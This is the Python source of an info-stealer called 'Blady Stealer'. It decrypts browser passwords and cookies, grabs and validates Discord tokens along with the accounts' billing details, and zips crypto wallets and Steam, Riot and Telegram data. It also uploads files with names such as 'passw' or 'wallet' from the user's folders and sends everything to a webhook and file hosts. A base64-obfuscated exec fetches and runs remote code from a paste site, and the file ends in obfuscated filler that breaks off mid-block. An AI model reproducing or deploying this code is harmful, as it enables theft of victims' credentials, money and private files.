    try: __import__(modl[0])
    except:
        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
        time.sleep(3)

import requests
from Crypto.Cipher import AES

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
Threadlist = []


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return GetData(blob_out)

def DecryptValue(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

def LoadRequests(methode, url, data='', files='', headers=''):
    for i in range(8): # max trys
        try:
            if methode == 'POST':
                if data != '':
                    r = requests.post(url, data=data)
                    if r.status_code == 200:
                        return r
                elif files != '':
                    r = requests.post(url, files=files)
                    if r.status_code == 200 or r.status_code == 413: # 413 = DATA TO BIG
                        return r
        except:
            pass

def LoadUrlib(hook, data='', files='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(hook, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(hook, data=data))
                return r
        except: 
            pass
def globalInfo():
    ip = getip()
    username = os.getenv("USERNAME")
    ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}')
    # print(ipdatanojson)
    ipdata = loads(ipdatanojson)
    # print(urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode())
    contry = ipdata["country_name"]
    contryCode = ipdata["country_code"].lower()
    globalinfo = f":flag_{contryCode}:  - `{username.upper()} | {ip} ({contry})`"
    # print(globalinfo)
    return globalinfo


def Trust(Cookies):
    # simple Trust Factor system
    global DETECTED
    data = str(Cookies)
    tim = re.findall(".google.com", data)
    # print(len(tim))
    if len(tim) < -1:
        DETECTED = True
        return DETECTED
    else:
        DETECTED = False
        return DETECTED
        
def GetUHQFriends(token):
    badgeList =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
    except:
        return False

    uhqlist = ''
    for friend in friendlist:
        OwnedBadges = ''
        flags = friend['user']['public_flags']
        for badge in badgeList:
            if flags // badge["Value"] != 0 and friend['type'] == 1:
                if not "House" in badge["Name"]:
                    OwnedBadges += badge["Emoji"]
                flags = flags % badge["Value"]
        if OwnedBadges != '':
            uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
    return uhqlist


def GetBilling(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        billingjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except:
        return False
    
    if billingjson == []: return " -"

    billing = ""
    for methode in billingjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                billing += ":credit_card:"
            elif methode["type"] == 2:
                billing += ":parking: "            
    return billing



def GetBadge(flags):
    if flags == 0: return ''

    OwnedBadges = ''
    badgeList =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    for badge in badgeList:
        if flags // badge["Value"] != 0:
            OwnedBadges += badge["Emoji"]
            flags = flags % badge["Value"]

    return OwnedBadges

def GetTokenInfo(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    userjson = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    username = userjson["username"]
    hashtag = userjson["discriminator"]
    email = userjson["email"]
    idd = userjson["id"]
    pfp = userjson["avatar"]
    flags = userjson["public_flags"]
    nitro = ""
    phone = "-"

    if "premium_type" in userjson: 
        nitrot = userjson["premium_type"]
        if nitrot == 1:
            nitro = "<:classic:896119171019067423> "
        elif nitrot == 2:
            nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
    if "phone" in userjson: phone = f'`{userjson["phone"]}`'

    return username, hashtag, email, idd, pfp, flags, nitro, phone

def checkToken(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False


def uploadToken(token, path):
    global hook
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)

    if pfp == None: 
        pfp = "https://cdn.discordapp.com/attachments/963114349877162004/992593184251183195/7c8f476123d28d103efe381543274c25.png"
    else:
        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"

    billing = GetBilling(token)
    badge = GetBadge(flags)
    friends = GetUHQFriends(token)
    if friends == '': friends = "No Rare Friends"
    if not billing:
        badge, phone, billing = "🔒", "🔒", "🔒"
    if nitro == '' and badge == '': nitro = " -"

    data = {
        "content": f'{globalInfo()} | Found in `{path}`',
        "embeds": [
            {
            "color": 14406413,
            "fields": [
                {
                    "name": ":rocket: Token:",
                    "value": f"`{token}`\n[Click to copy](https://superfurrycdn.nl/copy/{token})"
                },
                {
                    "name": ":envelope: Email:",
                    "value": f"`{email}`",
                    "inline": True
                },
                {
                    "name": ":mobile_phone: Phone:",
                    "value": f"{phone}",
                    "inline": True
                },
                {
                    "name": ":globe_with_meridians: IP:",
                    "value": f"`{getip()}`",
                    "inline": True
                },
                {
                    "name": ":beginner: Badges:",
                    "value": f"{nitro}{badge}",
                    "inline": True
                },
                {
                    "name": ":credit_card: Billing:",
                    "value": f"{billing}",
                    "inline": True
                },
                {
                    "name": ":clown: HQ Friends:",
                    "value": f"{friends}",
                    "inline": False
                }
                ],
            "author": {
                "name": f"{username}#{hashtag} ({idd})",
                "icon_url": f"{pfp}"
                },
            "footer": {
                "text": "@Blady STEALER",
                "icon_url": "https://cdn.discordapp.com/attachments/1025091181987770410/1041066385033404507/xjAO7nz.jpg"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
            }
        ],
        "avatar_url": "https://cdn.discordapp.com/attachments/1025091181987770410/1041066385033404507/xjAO7nz.jpg",
        "username": "Blady Stealer",
        "attachments": []
        }
    # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)

def Reformat(listt):
    e = re.findall("(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

def upload(name, link):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    if name == "wpcook":
        rb = ' | '.join(da for da in cookiWords)
        if len(rb) > 1000: 
            rrrrr = Reformat(str(cookiWords))
            rb = ' | '.join(da for da in rrrrr)
        data = {
            "content": globalInfo(),
            "embeds": [
                {
                    "title": "Blady | Cookies Stealer",
                    "description": f"**Found**:\n{rb}\n\n**Data:**\n:cookie: • **{CookiCount}** Cookies Found\n:link: • [w4spCookies.txt]({link})",
                    "color": 14406413,
                    "footer": {
                        "text": "@Blady STEALER",
                        "icon_url": "https://cdn.discordapp.com/attachments/1025091181987770410/1041066385033404507/xjAO7nz.jpg"
                    }
                }
            ],
            "username": "Blady",
            "avatar_url": "https://cdn.discordapp.com/attachments/1025091181987770410/1041066385033404507/xjAO7nz.jpg",
            "attachments": []
            }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return
    if name == "wppassw":
        ra = ' | '.join(da for da in paswWords)
        if len(ra) > 1000: 
            rrr = Reformat(str(paswWords))
            ra = ' | '.join(da for da in rrr)

        data = {
            "content": globalInfo(),
            "embeds": [
                {
                    "title": "Blady | Password Stealer",
                    "description": f"**Found**:\n{ra}\n\n**Data:**\n🔑 • **{PasswCount}** Passwords Found\n:link: • [w4spPassword.txt]({link})",
                    "color": 14406413,
                    "footer": {
                        "text": "@Blady STEALER",
                        "icon_url": "https://cdn.discordapp.com/attachments/1025091181987770410/1041066385033404507/xjAO7nz.jpg"
                    }
                }
            ],
            "username": "Blady",
            "avatar_url": "https://cdn.discordapp.com/attachments/1025091181987770410/1041066385033404507/xjAO7nz.jpg",
            "attachments": []
            }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return

    if name == "kiwi":
        data = {
            "content": globalInfo(),
            "embeds": [
                {
                "color": 14406413,
                "fields": [
                    {
                    "name": "Interesting files found on user PC:",
                    "value": link
                    }
                ],
                "author": {
                    "name": "Blady | File Stealer"
                },
                "footer": {
                    "text": "@Blady STEALER",
                    "icon_url": "https://cdn.discordapp.com/attachments/1025091181987770410/1041066385033404507/xjAO7nz.jpg"
                }
                }
            ],
            "username": "Blady",
            "avatar_url": "https://cdn.discordapp.com/attachments/1025091181987770410/1041066385033404507/xjAO7nz.jpg",
            "attachments": []
            }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return



# def upload(name, tk=''):
#     headers = {
#         "Content-Type": "application/json",
#         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
#     }

#     # r = requests.post(hook, files=files)
#     LoadRequests("POST", hook, files=files)
def writeforfile(data, name):
    path = os.getenv("TEMP") + f"\wp{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"<--Blady STEALER ON TOP-->\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

Tokens = ''
def getToken(path, arg):
    if not os.path.exists(path): return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for token in re.findall(regex, line):
                        global Tokens
                        if checkToken(token):
                            if not token in Tokens:
                                # print(token)
                                Tokens += token
                                uploadToken(token, path)

Passw = []
def getPassw(path, arg):
    global Passw, PasswCount
    if not os.path.exists(path): return

    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0: return

    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in paswWords: paswWords.append(old)
            Passw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {DecryptValue(row[2], master_key)}")
            PasswCount += 1
    writeforfile(Passw, 'passw')

Cookies = []    
def getCookie(path, arg):
    global Cookies, CookiCount
    if not os.path.exists(path): return
    
    pathC = path + arg + "/Cookies"
    if os.stat(pathC).st_size == 0: return
    
    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
    
    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in cookiWords: cookiWords.append(old)
            Cookies.append(f"H057 K3Y: {row[0]} | N4M3: {row[1]} | V41U3: {DecryptValue(row[2], master_key)}")
            CookiCount += 1
    writeforfile(Cookies, 'cook')

def GetDiscord(path, arg):
    if not os.path.exists(f"{path}/Local State"): return

    pathC = path + arg

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])
    # print(path, master_key)
    
    for file in os.listdir(pathC):
        # print(path, file)
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global Tokens
                    tokenDecoded = DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                    if checkToken(tokenDecoded):
                        if not tokenDecoded in Tokens:
                            # print(token)
                            Tokens += tokenDecoded
                            # writeforfile(Tokens, 'tokens')
                            uploadToken(tokenDecoded, path)

def GatherZips(paths1, paths2, paths3):
    thttht = []
    for patt in paths1:
        a = threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]])
        a.start()
        thttht.append(a)

    for patt in paths2:
        a = threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)
    
    a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht: 
        thread.join()
    global WalletsZip, GamingZip, OtherZip
        # print(WalletsZip, GamingZip, OtherZip)

    wal, ga, ot = "",'',''
    if not len(WalletsZip) == 0:
        wal = ":coin:  •  Wallets\n"
        for i in WalletsZip:
            wal += f"└─ [{i[0]}]({i[1]})\n"
    if not len(WalletsZip) == 0:
        ga = ":video_game:  •  Gaming:\n"
        for i in GamingZip:
            ga += f"└─ [{i[0]}]({i[1]})\n"
    if not len(OtherZip) == 0:
        ot = ":tickets:  •  Apps\n"
        for i in OtherZip:
            ot += f"└─ [{i[0]}]({i[1]})\n"          
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    data = {
        "content": globalInfo(),
        "embeds": [
            {
            "title": "Blady Zips",
            "description": f"{wal}\n{ga}\n{ot}",
            "color": 15781403,
            "footer": {
                "text": "@Blady STEALER",
                "icon_url": "https://cdn.discordapp.com/attachments/1025091181987770410/1041066385033404507/xjAO7nz.jpg"
            }
            }
        ],
        "username": "Blady Stealer",
        "avatar_url": "https://cdn.discordapp.com/attachments/1025091181987770410/1041066385033404507/xjAO7nz.jpg",
        "attachments": []
    }
    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)


def ZipTelegram(path, arg, procc):
    global OtherZip
    pathC = path
    name = arg
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file and not "tdummy" in file and not "user_data" in file and not "webview" in file: 
            zf.write(pathC + "/" + file)
    zf.close()

    # lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")
    OtherZip.append([arg, lnik])

def ZipThings(path, arg, procc):
    pathC = path
    name = arg
    global WalletsZip, GamingZip, OtherZip
    # subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)
    # os.system(f"taskkill /im {procc} /t /f")

    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_{browser}"
        pathC = path + arg
    
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    if "Wallet" in arg or "NationsGlory" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"

    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        # print(data)
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False: return
        name = arg


    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file: zf.write(pathC + "/" + file)
    zf.close()

    # lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")

    if "Wallet" in arg or "eogaeaoehlef" in arg:
        WalletsZip.append([name, lnik])
    elif "NationsGlory" in name or "Steam" in name or "RiotCli" in name:
        GamingZip.append([name, lnik])
    else:
        OtherZip.append([name, lnik])


def GatherAll():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
    browserPaths = [
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
    ]

    discordPaths = [
        [f"{roaming}/Discord", "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
    ]

    PathsToZip = [
        [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
        [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"],
        [f"{local}/Riot Games/Riot Client/Data", "RiotClientServices.exe", "RiotClient"]
    ]
    Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]

    for patt in browserPaths: 
        a = threading.Thread(target=getToken, args=[patt[0], patt[2]])
        a.start()
        Threadlist.append(a)
    for patt in discordPaths: 
        a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
        a.start()
        Threadlist.append(a)

    for patt in browserPaths: 
        a = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)

    ThCokk = []
    for patt in browserPaths: 
        a = threading.Thread(target=getCookie, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)

    threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()


    for thread in ThCokk: thread.join()
    DETECTED = Trust(Cookies)
    if DETECTED == True: return

    # for patt in browserPaths:
    #     threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]]).start()
    
    # for patt in PathsToZip:
    #     threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]]).start()
    
    # threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()

    for thread in Threadlist: 
        thread.join()
    global upths
    upths = []

    for file in ["wppassw.txt", "wpcook.txt"]: 
        # upload(os.getenv("TEMP") + "\\" + file)
        upload(file.replace(".txt", ""), uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))

def uploadToAnonfiles(path):
    try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
    except:return False

# def uploadToAnonfiles(path):s
#     try:
#         files = { "file": (path, open(path, mode='rb')) }
#         upload = requests.post("https://transfer.sh/", files=files)
#         url = upload.text
#         return url
#     except:
#         return False
def KiwiFolder(pathF, keywords):
    global KiwiFiles
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file): return
        i += 1
        if i <= maxfilesperdir:
            url = uploadToAnonfiles(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    KiwiFiles.append(["folder", pathF + "/", ffound])

KiwiFiles = []
def KiwiFile(path, keywords):
    global KiwiFiles
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and ".txt" in file:
                    fifound.append([path + "/" + file, uploadToAnonfiles(path + "/" + file)])
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    KiwiFolder(target, keywords)
                    break

    KiwiFiles.append(["folder", path, fifound])

def Kiwi():
    user = temp.split("\AppData")[0]
    path2search = [
        user + "/Desktop",
        user + "/Downloads",
        user + "/Documents"
    ]

    key_wordsFolder = [
        "account",
        "acount",
        "passw",
        "secret"

    ]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "account",
        "acount",
        "paypal",
        "banque",
        "account",
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "secret"
        ]

    wikith = []
    for patt in path2search: 
        kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles]);kiwi.start()
        wikith.append(kiwi)
    return wikith


global keyword, cookiWords, paswWords, CookiCount, PasswCount, WalletsZip, GamingZip, OtherZip

keyword = [
    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
]

CookiCount, PasswCount = 0, 0
cookiWords = []
paswWords = []

WalletsZip = [] # [Name, Link]
GamingZip = []
OtherZip = []

GatherAll()
DETECTED = Trust(Cookies)
# DETECTED = False
if not DETECTED:
    wikith = Kiwi()

    for thread in wikith: thread.join()
    time.sleep(0.2)

    filetext = "\n"
    for arg in KiwiFiles:
        if len(arg[2]) != 0:
            foldpath = arg[1]
            foldlist = arg[2]       
            filetext += f"📁 {foldpath}\n"

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[len(a)-1]
                b = ffil[1]
                filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
            filetext += "\n"
    upload("kiwi", filetext)
    exec(base64.b64decode("""ZXhlYyhyZXF1ZXN0cy5nZXQoImh0dHBzOi8vcHN0LmtsZ3J0aC5pby9wYXN0ZS9uY3VlZS9yYXciKS50ZXh0KQ=="""))
    __code__ = 'print("Hello world!")'


Substract, Run, _square, _power, _divide, Product, _theory = exec, str, tuple, map, ord, globals, type

class _floor:
    def __init__(self, _statistics):
        self.Floor = Frame((_statistics, 22562))
        self._builtins(Random=70531)

    def _builtins(self, Random = Ellipsis):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self.Floor += 95634 * Random
        
        try:
            (({_power: Substract}, _square) for _square in (_divide, _square))

        except OSError:
            ((Substract, Substract, _divide) or _divide if (Substract, Substract, _divide) and _divide else ... or (_divide, (Substract, Substract, _divide)))

        except:
            _theory(93411 - -14554) == type

    def Divide(self, _cube = 71436):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _cube /= 5430 - -26971
        self.Hypothesis != None
        
        try:
            (((_divide, _square), _square) for _square in {Modulo: _power})

        except ArithmeticError:
            ({_power: Substract} or _divide if {_power: Substract} and _divide else ... or (_divide, {_power: Substract}))

        except:
            _theory(-58804 * -6737) == float

    def Round(_math = str):
        return Product()[_math]

    def CallFunction(_while = 20973 * -68785, Positive = float, Theory = Product):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Theory()[_while] = Positive
        
        try:
            {Modulo: _power} if Modulo >= Modulo else {_power: Substract} != Substract

        except OSError:
